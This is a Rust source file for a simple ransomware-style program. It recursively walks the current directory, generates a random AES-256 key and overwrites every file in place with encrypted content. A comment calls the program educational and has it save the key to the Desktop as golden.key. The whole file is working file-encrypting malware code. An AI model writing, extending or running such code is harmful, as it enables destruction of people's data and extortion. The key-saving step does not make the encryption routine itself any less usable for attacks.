// Common crates
// ---------------

use std::io::Write;
use std::path::{Path,PathBuf};
use std::fs::{read,write,OpenOptions};

// External crates
// -----------------

use dirs::desktop_dir;
use walkdir::WalkDir;
use aesstream::AesWriter;
use rand::{thread_rng,Rng};
use crypto::aessafe::AesSafe256Encryptor;

// Methods
// --------

fn fetch_files
(origin: &str) -> ()
{
    // Find the Desktop
    if let Some(mut desktop) = desktop_dir() {
        // Find files
        let walk = WalkDir::new(origin)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_file());
        // Generate the key
        let key: [u8;32] = generate_key(&mut desktop);
        // Initialize the encryptor
        let encryptor: AesSafe256Encryptor = AesSafe256Encryptor::new(&key);

        // Encrypt files with the random key
        for file in walk {
            encrypt_file(file.path(), encryptor);
        }
    }
}

fn generate_key
(desktop: &mut PathBuf) -> [u8;32]
{
    // Random 32-byte length key
    let key: [u8;32] = thread_rng().gen();
    // Create a file with the key in the Desktop
    // -- BECAUSE THIS IS FOR EDUCATIONAL PURPOSES ONLY --
    desktop.push("golden.key");
    write(desktop, key)
        .expect("Key cannot be written. So unlucky...");
    // Return the key
    return key;
}

fn encrypt_file
(path: &Path, encryptor: AesSafe256Encryptor) -> ()
{
    // Open the file
    if let Ok(file) = OpenOptions::new().write(true).open(path) {
        // Read the content
        if let Ok(content) = read(path) {
            // Start the writer
            if let Ok(mut writer) = AesWriter::new(file,encryptor) {
                let _ = writer.write_all(&content);
            }
        }
    }
}

// Entrypoint
// -----------

fn main
() -> ()
{
    // Encyipt all files in
    // the current directory
    fetch_files(".");
}
